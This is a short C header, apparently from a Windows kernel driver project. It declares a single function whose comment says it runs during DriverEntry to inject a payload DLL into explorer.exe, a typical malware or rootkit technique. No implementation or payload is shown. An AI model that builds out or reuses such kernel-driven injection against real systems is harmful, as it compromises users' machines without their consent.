#pragma once
#include <ntddk.h>

// Called once during DriverEntry to inject the payload DLL into explorer.exe
NTSTATUS Phase2_TriggerInjection(void);
